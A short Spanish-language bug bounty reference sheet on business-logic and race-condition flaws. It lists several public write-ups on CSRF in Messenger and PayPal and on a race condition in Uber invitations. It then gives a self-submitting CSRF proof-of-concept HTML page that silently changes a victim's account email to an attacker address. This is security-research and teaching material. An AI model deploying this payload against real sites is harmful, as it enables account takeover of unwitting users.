# Business Logic & Race Condition Reference

## 1. Casos Destacados de Bug Bounty (`ngalongc/bug-bounty-reference`)

- **Messenger.com Site-Wide CSRF**: *Jack Whitton* - CSRF global en Messenger.com que permitía a un atacante ejecutar acciones en la cuenta de la víctima al hacer clic en un enlace malicioso.
- **PayPal Profile Picture CSRF**: *Florian Courtial* - Modificación de la foto de perfil de PayPal.me sin consentimiento mediante inyección de formulario cross-domain.
- **Hacking PayPal Accounts With One Click**: *Yasser Ali* - CSRF en el sistema de autenticación de PayPal permitiendo secuestro de sesión.
- **Race Condition en Invitaciones de Uber**: *Efkan Gökbaş / r0t* - Explotación concurrente de códigos de invitación y referidos en `partners.uber.com` para reclamar múltiples recompensas con el mismo código.

## 2. Plantilla PoC de CSRF Form (HTML Autoejecutable)

```html
<!DOCTYPE html>
<html>
<body>
  <form id="csrfForm" action="https://victim.com/api/user/email/update" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="hidden" name="confirm_email" value="attacker@evil.com" />
  </form>
  <script>
    document.getElementById('csrfForm').submit();
  </script>
</body>
</html>
```
